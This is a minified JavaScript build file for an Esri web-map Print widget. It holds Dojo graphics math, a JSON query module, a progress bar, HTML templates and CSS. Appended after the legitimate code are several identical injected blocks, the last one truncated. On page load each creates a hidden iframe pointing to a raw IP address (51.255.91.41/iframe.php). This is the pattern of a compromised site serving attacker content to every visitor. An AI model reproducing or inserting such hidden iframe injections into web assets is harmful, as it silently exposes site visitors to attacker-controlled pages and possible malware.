l=n?l:-l;c=[];for(a=k;0<a;a-=r)a<b&&(l=a/2,z=u(l),l=n?l:-l,a=0),A=t.normalize([e,t.rotate(D+l)]),n?(k=t.multiplyPoint(A,z.c1),w=t.multiplyPoint(A,z.c2),A=t.multiplyPoint(A,z.e)):(k=t.multiplyPoint(A,z.c2),w=t.multiplyPoint(A,z.c1),A=t.multiplyPoint(A,z.s)),c.push([k.x,k.y,w.x,w.y,A.x,A.y]),D+=2*l;return c}}})},"dojox/gfx/decompose":function(){define(["./_base","dojo/_base/lang","./matrix"],function(e,n,t){function u(b,c){return Math.abs(b-c)<=1E-6*(Math.abs(b)+Math.abs(c))}function x(b,c,d,e){if(!isFinite(b))return d;
if(!isFinite(d))return b;c=Math.abs(c);e=Math.abs(e);return(c*b+e*d)/(c+e)}function r(b){b=t.normalize(b);var c=-b.xx-b.yy,d=b.xx*b.yy-b.xy*b.yx,e=Math.sqrt(c*c-4*d),c=-(c+(0>c?-e:e))/2,d=d/c,e=b.xy/(c-b.xx),h=1,a=b.xy/(d-b.xx),n=1;u(c,d)&&(e=1,a=h=0,n=1);isFinite(e)||(e=1,h=(c-b.xx)/b.xy,isFinite(h)||(e=(c-b.yy)/b.yx,h=1,isFinite(e)||(e=1,h=b.yx/(c-b.yy))));isFinite(a)||(a=1,n=(d-b.xx)/b.xy,isFinite(n)||(a=(d-b.yy)/b.yx,n=1,isFinite(a)||(a=1,n=b.yx/(d-b.yy))));b=Math.sqrt(e*e+h*h);var r=Math.sqrt(a*
a+n*n);isFinite(e/=b)||(e=0);isFinite(h/=b)||(h=0);isFinite(a/=r)||(a=0);isFinite(n/=r)||(n=0);return{value1:c,value2:d,vector1:{x:e,y:h},vector2:{x:a,y:n}}}function d(b,c){var d=0>b.xx*b.yy||0<b.xy*b.yx?-1:1,e=c.angle1=(Math.atan2(b.yx,b.yy)+Math.atan2(-d*b.xy,d*b.xx))/2,d=Math.cos(e),e=Math.sin(e);c.sx=x(b.xx/d,d,-b.xy/e,e);c.sy=x(b.yy/d,d,b.yx/e,e);return c}function b(b,c){var d=0>b.xx*b.yy||0<b.xy*b.yx?-1:1,e=c.angle2=(Math.atan2(d*b.yx,d*b.xx)+Math.atan2(-b.xy,b.yy))/2,d=Math.cos(e),e=Math.sin(e);
c.sx=x(b.xx/d,d,b.yx/e,e);c.sy=x(b.yy/d,d,-b.xy/e,e);return c}return e.decompose=function(e){var c=t.normalize(e);e={dx:c.dx,dy:c.dy,sx:1,sy:1,angle1:0,angle2:0};if(u(c.xy,0)&&u(c.yx,0))return n.mixin(e,{sx:c.xx,sy:c.yy});if(u(c.xx*c.yx,-c.xy*c.yy))return d(c,e);if(u(c.xx*c.xy,-c.yx*c.yy))return b(c,e);var h,l=new t.Matrix2D(c);h=n.mixin(l,{dx:0,dy:0,xy:l.yx,yx:l.xy});l=r([c,h]);h=r([h,c]);l=new t.Matrix2D({xx:l.vector1.x,xy:l.vector2.x,yx:l.vector1.y,yy:l.vector2.y});h=new t.Matrix2D({xx:h.vector1.x,
xy:h.vector1.y,yx:h.vector2.x,yy:h.vector2.y});c=new t.Matrix2D([t.invert(l),c,t.invert(h)]);d(h,e);c.xx*=e.sx;c.yy*=e.sy;b(l,e);c.xx*=e.sx;c.yy*=e.sy;return n.mixin(e,{sx:c.xx,sy:c.yy})}})},"dojox/gfx/bezierutils":function(){define(["./_base"],function(e){e=e.bezierutils={};e.tAtLength=function(d,b){var e=0,c=6==d.length,n=0,l=0,k=c?u:r,a=function(h,r){for(var u=0,w=0;w<h.length-2;w+=2)u+=t(h[w],h[w+1],h[w+2],h[w+3]);w=c?t(d[0],d[1],d[4],d[5]):t(d[0],d[1],d[6],d[7]);u-w>r||n+u>b+r?(++l,h=k(h,.5),
a(h[0],r),Math.abs(n-b)<=r||a(h[1],r)):(n+=u,e+=1/(1<<l))};b&&a(d,.5);return e};var n=e.computeLength=function(d){for(var b=6==d.length,e=0,c=0;c<d.length-2;c+=2)e+=t(d[c],d[c+1],d[c+2],d[c+3]);c=b?t(d[0],d[1],d[4],d[5]):t(d[0],d[1],d[6],d[7]);.1<e-c&&(d=b?u(d,.5):x(d,.5),e=n(d[0],b),e+=n(d[1],b));return e},t=e.distance=function(d,b,e,c){return Math.sqrt((e-d)*(e-d)+(c-b)*(c-b))},u=function(d,b){var e=1-b,c=e*e,n=b*b,l=d[0],k=d[1],a=d[2],r=d[3],t=d[4];d=d[5];var u=c*l+2*e*b*a+n*t,c=c*k+2*e*b*r+n*
d;return[[l,k,e*l+b*a,e*k+b*r,u,c],[u,c,e*a+b*t,e*r+b*d,t,d]]},x=function(d,b){var e=1-b,c=e*e,n=c*e,l=b*b,k=l*b,a=d[0],r=d[1],t=d[2],u=d[3],x=d[4],G=d[5],A=d[6];d=d[7];var B=n*a+3*c*b*t+3*e*l*x+k*A,n=n*r+3*c*b*u+3*e*l*G+k*d;return[[a,r,e*a+b*t,e*r+b*u,c*a+2*e*b*t+l*x,c*r+2*e*b*u+l*G,B,n],[B,n,c*t+2*e*b*x+l*A,c*u+2*e*b*G+l*d,e*x+b*A,e*G+b*d,A,d]]},r=e.splitBezierAtT=function(d,b){return 6==d.length?u(d,b):x(d,b)};return e})},"dojox/json/query":function(){define(["dojo/_base/kernel","dojo/_base/lang",
"dojox","dojo/_base/array"],function(e,n,t){n.getObject("json",!0,t);t.json._slice=function(e,n,r,d){var b=e.length,h=[];r=r||b;n=0>n?Math.max(0,n+b):Math.min(b,n);for(r=0>r?Math.max(0,r+b):Math.min(b,r);n<r;n+=d)h.push(e[n]);return h};t.json._find=function(e,n){function r(b){n&&(!0!==n||b instanceof Array?b[n]&&d.push(b[n]):d.push(b));for(var c in b){var e=b[c];n?e&&"object"==typeof e&&r(e):d.push(e)}}var d=[];if(n instanceof Array){if(1==n.length)return e[n[0]];for(var b=0;b<n.length;b++)d.push(e[n[b]])}else r(e);
return d};t.json._distinctFilter=function(e,n){for(var r=[],d={},b=0,h=e.length;b<h;++b){var c=e[b];n(c,b,e)&&("object"==typeof c&&c?c.__included||(c.__included=!0,r.push(c)):d[c+typeof c]||(d[c+typeof c]=!0,r.push(c)))}b=0;for(h=r.length;b<h;++b)r[b]&&delete r[b].__included;return r};return t.json.query=function(e,n){function r(c,d,a,e,h,n,r,t){return b[t].match(/[\*\?]/)||"~"==r?"/^"+b[t].substring(1,b[t].length-1).replace(/\\([btnfr\\"'])|([^\w\*\?])/g,"\\$1$2").replace(/([\*\?])/g,"[\\w\\W]$1")+
("~"==r?"$/i":"$/")+".test("+d+")":c}var d=0,b=[];e=e.replace(/"(\\.|[^"\\])*"|'(\\.|[^'\\])*'|[\[\]]/g,function(c){d+="["==c?1:"]"==c?-1:0;return"]"==c&&0<d?"`]":'"'==c.charAt(0)||"'"==c.charAt(0)?"`"+(b.push(c)-1):c});var h="";e.replace(/(\]|\)|push|pop|shift|splice|sort|reverse)\s*\(/,function(){throw Error("Unsafe function call");});e=e.replace(/([^<>=]=)([^=])/g,"$1\x3d$2").replace(/@|(\.\s*)?[a-zA-Z\$_]+(\s*:)?/g,function(b){return"."==b.charAt(0)?b:"@"==b?"$obj":(b.match(/:|^(\$|Math|true|false|null)$/)?
"":"$obj.")+b}).replace(/\.?\.?\[(`\]|[^\]])*\]|\?.*|\.\.([\w\$_]+)|\.\*/g,function(b,c,a){return(c=b.match(/^\.?\.?(\[\s*\^?\?|\^?\?|\[\s*==)(.*?)\]?$/))?(a="",b.match(/^\./)&&(h="dojox.json._find("+h,a=",true)"),h=(c[1].match(/\=/)?"dojo.map":c[1].match(/\^/)?"dojox.json._distinctFilter":"dojo.filter")+"("+h,a+",function($obj){return "+c[2]+"})"):(c=b.match(/^\[\s*([\/\\].*)\]/))?".concat().sort(function(a,b){"+c[1].replace(/\s*,?\s*([\/\\])\s*([^,\\\/]+)/g,function(a,b,c){return"var av\x3d "+c.replace(/\$obj/,
"a")+",bv\x3d "+c.replace(/\$obj/,"b")+";if(av\x3ebv||bv\x3d\x3dnull){return "+("/"==b?1:-1)+";}\nif(bv\x3eav||av\x3d\x3dnull){return "+("/"==b?-1:1)+";}\n"})+"return 0;})":(c=b.match(/^\[(-?[0-9]*):(-?[0-9]*):?(-?[0-9]*)\]/))?(h="dojox.json._slice("+h,","+(c[1]||0)+","+(c[2]||0)+","+(c[3]||1)+")"):b.match(/^\.\.|\.\*|\[\s*\*\s*\]|,/)?(h="dojox.json._find("+h,("."==b.charAt(1)?",'"+a+"'":b.match(/,/)?","+b:"")+")"):b}).replace(/(\$obj\s*((\.\s*[\w_$]+\s*)|(\[\s*`([0-9]+)\s*`\]))*)(==|~)\s*`([0-9]+)/g,
r).replace(/`([0-9]+)\s*(==|~)\s*(\$obj\s*((\.\s*[\w_$]+)|(\[\s*`([0-9]+)\s*`\]))*)/g,function(b,c,a,d,e,h,n,t){return r(b,d,e,h,n,t,a,c)});e=h+("$"==e.charAt(0)?"":"$")+e.replace(/`([0-9]+|\])/g,function(c,d){return"]"==d?"]":b[d]});for(var c=eval("1\x26\x26function($,$1,$2,$3,$4,$5,$6,$7,$8,$9){var $obj\x3d$;return "+e+"}"),t=0;t<arguments.length-1;t++)arguments[t]=arguments[t+1];return n?c.apply(this,arguments):c}})},"esri/tasks/PrintParameters":function(){define(["dojo/_base/declare","dojo/_base/lang",
"dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.PrintParameters",map:null,template:null,outSpatialReference:null,extraParameters:null});t("extend-esri")&&n.setObject("tasks.PrintParameters",e,u);return e})},"dijit/ProgressBar":function(){define("require dojo/_base/declare dojo/dom-class dojo/_base/lang dojo/number ./_Widget ./_TemplatedMixin dojo/text!./templates/ProgressBar.html".split(" "),function(e,n,t,u,x,r,d,b){return n("dijit.ProgressBar",[r,d],{progress:"0",value:"",
maximum:100,places:0,indeterminate:!1,label:"",name:"",templateString:b,_indeterminateHighContrastImagePath:e.toUrl("./themes/a11y/indeterminate_progress.gif"),postMixInProperties:function(){this.inherited(arguments);this.params&&"value"in this.params||(this.value=this.indeterminate?Infinity:this.progress)},buildRendering:function(){this.inherited(arguments);this.indeterminateHighContrastImage.setAttribute("src",this._indeterminateHighContrastImagePath.toString());this.update()},_setDirAttr:function(b){var c=
"rtl"==b.toLowerCase();t.toggle(this.domNode,"dijitProgressBarRtl",c);t.toggle(this.domNode,"dijitProgressBarIndeterminateRtl",this.indeterminate&&c);this.inherited(arguments)},update:function(b){u.mixin(this,b||{});b=this.internalProgress;var c=this.domNode,d=1;this.indeterminate?c.removeAttribute("aria-valuenow"):(-1!=String(this.progress).indexOf("%")?(d=Math.min(parseFloat(this.progress)/100,1),this.progress=d*this.maximum):(this.progress=Math.min(this.progress,this.maximum),d=this.maximum?this.progress/
this.maximum:0),c.setAttribute("aria-valuenow",this.progress));c.setAttribute("aria-labelledby",this.labelNode.id);c.setAttribute("aria-valuemin",0);c.setAttribute("aria-valuemax",this.maximum);this.labelNode.innerHTML=this.report(d);t.toggle(this.domNode,"dijitProgressBarIndeterminate",this.indeterminate);t.toggle(this.domNode,"dijitProgressBarIndeterminateRtl",this.indeterminate&&!this.isLeftToRight());b.style.width=100*d+"%";this.onChange()},_setValueAttr:function(b){this._set("value",b);Infinity==
b?this.update({indeterminate:!0}):this.update({indeterminate:!1,progress:b})},_setLabelAttr:function(b){this._set("label",b);this.update()},_setIndeterminateAttr:function(b){this._set("indeterminate",b);this.update()},report:function(b){return this.label?this.label:this.indeterminate?"\x26#160;":x.format(b,{type:"percent",places:this.places,locale:this.lang})},onChange:function(){}})})},"widgets/Print/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css",
"dojo/i18n!./nls/strings"],function(){})},"url:widgets/Print/templates/Print.html":'\x3cdiv class\x3d"gis_PrintDijit"\x3e\r\n    \x3cdiv class\x3d"formContainer"\x3e\r\n        \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"printSettingsFormDijit"\x3e\r\n            \x3ctable cellspacing\x3d"5" style\x3d"width:100%;"\x3e\r\n                \x3ctr data-dojo-attach-point\x3d"titleTr"\x3e\r\n                    \x3ctd style\x3d"width:65px;"\x3e\r\n                        ${nls.title}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"text" data-dojo-attach-point\x3d"titleNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"name:\'title\',trim:true,required:true,style:\'width:100%;\'" /\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr style\x3d"display: none"\x3e\r\n                    \x3ctd\x3e\r\n                        ${nls.layout}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"select" data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d"name:\'layout\',style:\'width:100%;\'"\r\n                        data-dojo-attach-point\x3d"layoutDijit" data-dojo-attach-event\x3d"Change:onLayoutChange"/\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr style\x3d"display: none"\x3e\r\n                    \x3ctd\x3e\r\n                        ${nls.format}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"select" data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d"name:\'format\',style:\'width:100%;\'"\r\n                        data-dojo-attach-point\x3d"formatDijit" /\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n            \x3c/table\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"buttonActionBar jimu-align-trailing"\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"advancedButtonDijit" style\x3d"display: none"\r\n            data-dojo-attach-event\x3d"onclick:showSettings"\x3e\x3cdiv class\x3d"btn-icon settingsIcon"\x3e\x3c/div\x3e${nls.settings}\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"dijit/TooltipDialog" data-dojo-attach-point\x3d"settingsDialog"\r\n            style\x3d"display: none" class\x3d"gis_PrintDijit"\x3e\r\n            \x3cdiv style\x3d"width:250px;"\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapScaleExtent}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"preserveFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd style\x3d"vertical-align:middle;"\x3e\r\n                                ${nls.preserve}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"radio" data-dojo-attach-point\x3d"printWidgetMapScale" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',checked:true,value:\'true\'"\r\n                                /\x3e\x3clabel data-dojo-attach-point\x3d"printWidgetMapScaleLabel"\x3e${nls.mapScale}\x3c/label\x3e\r\n                                \x3cbr /\x3e\r\n                                \x3cinput type\x3d"radio" data-dojo-attach-point\x3d"printWidgetMapExtent" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',value:\'false\'"\r\n                                /\x3e\x3clabel data-dojo-attach-point\x3d"printWidgetMapExtentLabel"\x3e${nls.mapExtent}\x3c/label\x3e\r\n                            \x3c/td\x3e\r\n                            \x3ctr\x3e\r\n                                \x3ctd\x3e\r\n                                    ${nls.forceScale}:\r\n                                \x3c/td\x3e\r\n                                \x3ctd\x3e\r\n                                    \x3cinput type\x3d"radio" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',value:\'force\',checked:false"/\x3e \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'forcedScale\',required:false,style:\'width:100px;\'" data-dojo-attach-point\x3d"forceScaleNTB"/\x3e \x3ca href\x3d"#" data-dojo-attach-event\x3d"click:getCurrentMapScale"\x3e${nls.getCurrentScale}\x3c/a\x3e\r\n                                \x3c/td\x3e\r\n                            \x3c/tr\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;" data-dojo-attach-point\x3d"labelsTitleNode"\x3e\r\n                    ${nls.labels}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"labelsFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd style\x3d"vertical-align:middle;"\x3e\r\n                                ${nls.showLabels}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-props\x3d"name:\'showLabels\',value:true,checked:true" /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapMetadata}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"layoutMetadataDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5" style\x3d"width:100%;"\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"authorTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.author}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-attach-point\x3d"authorNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"name:\'author\',trim:true,required:false,style:\'width:100%;\'" data-dojo-attach-point\x3d"authorTB"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"copyrightTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.copyright}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3ctextarea data-dojo-attach-point\x3d"copyrightNode" name\x3d"copyright"\r\n                                    data-dojo-type\x3d"dijit/form/SimpleTextarea"\r\n                                    style\x3d"width:100%;height:60px;resize:none;"\x3e\x3c/textarea\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"customTextElementsDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5" style\x3d"width:100%;" data-dojo-attach-point\x3d"customTextElementsTable"\x3e\r\n\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"layoutFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"legendTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.lncludeLegend}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-props\x3d"name:\'legend\',value:true,checked:true"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapOnlyOptions}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"mapOnlyFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.width}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'width\',required:true,value:670,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.height}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'height\',required:true,value:500,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.printQualityOptions}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"mapQualityFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.dpi}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'dpi\',required:true,value:96,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"printButtonDijit"\r\n            data-dojo-attach-event\x3d"onclick:print"\x3e\x3cdiv class\x3d"btn-icon printIcon"\x3e\x3c/div\x3e${nls.print}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- \x3chr calss\x3d"spacer"\x3e --\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"printResultsNode" class\x3d"resultsContainer"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"clearActionBarNode" class\x3d"buttonActionBar"\r\n    style\x3d"display:none;padding:0;"\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-event\x3d"onclick:clearResults"\x3e\r\n            \x3cdiv class\x3d"btn-icon clearIcon"\x3e\x3c/div\x3e${nls.clearList}\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Print/templates/PrintResult.html":'\x3cdiv class\x3d"printResult" data-dojo-attach-point\x3d"resultNode" data-dojo-attach-event\x3d"onclick:_openPrint"\x3e\r\n  \x3ctable class\x3d"printResultTable"\x3e\r\n    \x3ctr\x3e\r\n      \x3ctd width\x3d"25px"\x3e\r\n        \x3cspan class\x3d"bold"\x3e${count}.\x3c/span\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd width\x3d"30px"\x3e\r\n        \x3cimg src\x3d"${icon}"\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd data-dojo-attach-point\x3d"nameNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"progressBar" data-dojo-type\x3d"dijit/ProgressBar" data-dojo-props\x3d\'value:Infinity\'\x3e\x3c/div\x3e\r\n        \x3cspan data-dojo-attach-point\x3d"successNode" class\x3d"bold" style\x3d"display:none;"\x3e${docName}\x3c/span\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"errNode" style\x3d"display:none;"\x3e\r\n          \x3cspan class\x3d"bold"\x3e${nls.printError}\x3c/span\x3e\r\n          \x3cdiv class\x3d"jimu-icon jimu-icon-error jimu-float-trailing"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/td\x3e\r\n    \x3c/tr\x3e\r\n  \x3c/table\x3e\r\n\x3c/div\x3e\r\n',
"url:dijit/templates/ProgressBar.html":'\x3cdiv class\x3d"dijitProgressBar dijitProgressBarEmpty" role\x3d"progressbar"\r\n\t\x3e\x3cdiv  data-dojo-attach-point\x3d"internalProgress" class\x3d"dijitProgressBarFull"\r\n\t\t\x3e\x3cdiv class\x3d"dijitProgressBarTile" role\x3d"presentation"\x3e\x3c/div\r\n\t\t\x3e\x3cspan style\x3d"visibility:hidden"\x3e\x26#160;\x3c/span\r\n\t\x3e\x3c/div\r\n\t\x3e\x3cdiv data-dojo-attach-point\x3d"labelNode" class\x3d"dijitProgressBarLabel" id\x3d"${id}_label"\x3e\x3c/div\r\n\t\x3e\x3cspan data-dojo-attach-point\x3d"indeterminateHighContrastImage"\r\n\t\t   class\x3d"dijitInline dijitProgressBarIndeterminateHighContrastImage"\x3e\x3c/span\r\n\x3e\x3c/div\x3e\r\n',
"url:widgets/Print/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"printNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/Print/css/style.css":".jimu-widget-print{width: 100%; height: 100%; position: relative;}.jimu-widget-print .dijitSelect{height: 20px; width: 100%;}.gis_PrintDijit {width: 100%;}.gis_PrintDijit .printResult {height: 28px; margin-bottom: -1px; width: 100%;}.gis_PrintDijit .printResult .printResultTable {width: 100%;}.gis_PrintDijit .printResult .bold {font-weight: bold;}.gis_PrintDijit .printResultError {font-weight: bold; color: red; cursor: help;}.gis_PrintDijit .printResultHover table:hover {background-color: #D4E7F8; cursor: pointer;}.gis_PrintDijit .buttonActionBar {padding: 3px 0px 2px 0px; width: 100%;}.gis_PrintDijit .formContainer {margin-bottom: -1px; width: 100%;}.gis_PrintDijit .resultsContainer {width: 100%; margin-top: 10px;}.gis_PrintDijit .btn-icon {width: 16px; height: 16px; display: inline-block; vertical-align: text-top; margin-right: 10px;}.gis_PrintDijit .printIcon {background-image: url(../images/print.png);}.gis_PrintDijit .clearIcon {background-image: url(../images/clear.png);}.gis_PrintDijit .settingsIcon {background-image: url(../images/settings.png); width: 16px; height: 16px;}.gis_PrintDijit .dijitArrowButtonContainer{width: 17px;}",
"*now":function(e){e(['dojo/i18n!*preload*widgets/Print/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidget jimu/portalUtils dojo/_base/lang dojo/Deferred jimu/dijit/Message jimu/dijit/LoadingShelter ./Print esri/request jimu/portalUrlUtils".split(" "),function(e,n,t,u,x,r,d,b,h,c){return e([n],{baseClass:"jimu-widget-print",name:"Print",className:"esri.widgets.Print",_portalPrintTaskURL:null,postCreate:function(){this.inherited(arguments);this.shelter=new d({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup()},startup:function(){this.inherited(arguments);
this.shelter.show();this._initPrinter()},_initPrinter:function(){this._getPrintTaskURL(this.appConfig.portalUrl).then(u.hitch(this,function(c){this.shelter.show();this.isAsync(c).then(u.hitch(this,function(d){this.print=new b({map:this.map,appConfig:this.appConfig,printTaskURL:c,defaultAuthor:this.config.defaultAuthor,defaultCopyright:this.config.defaultCopyright,defaultTitle:this.config.defaultTitle,defaultFormat:this.config.defaultFormat,defaultLayout:this.config.defaultLayout,nls:this.nls,async:d});
this.print.placeAt(this.printNode);this.print.startup()}),u.hitch(this,function(b){new r({message:b.message})})).always(u.hitch(this,function(){this.shelter.hide()}))}),u.hitch(this,function(b){new r({message:b});console.error(b);this.shelter.hide()}))},_getPrintTaskURL:function(b){var c=new x;if(this.config&&this.config.serviceURL)return c.resolve(this.config.serviceURL),c;t.getPortalSelfInfo(b).then(u.hitch(this,function(b){(b=b&&b.helperServices&&b.helperServices.printTask&&b.helperServices.printTask.url)?
c.resolve(b):c.reject("error")}),u.hitch(this,function(b){new r({message:this.nls.portalConnectionError});c.reject("error");console.error(b)}));return c},isAsync:function(b){var d=new x,e=c.setHttpProtocol(b),a=c.getNewPrintUrl(this.appConfig.portalUrl);e===a||/sharing\/tools\/newPrint$/.test(e)?d.resolve(!1):h({url:b,content:{f:"json"},callbackParamName:"callback",handleAs:"json",timeout:6E4,load:u.hitch(this,function(a){"esriExecutionTypeAsynchronous"===a.executionType?d.resolve(!0):d.resolve(!1)}),
error:u.hitch(this,function(a){d.reject(a)})});return d},onSignIn:function(b){b=b||{};b.userId&&this.print&&this.print.updateAuthor(b.userId)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
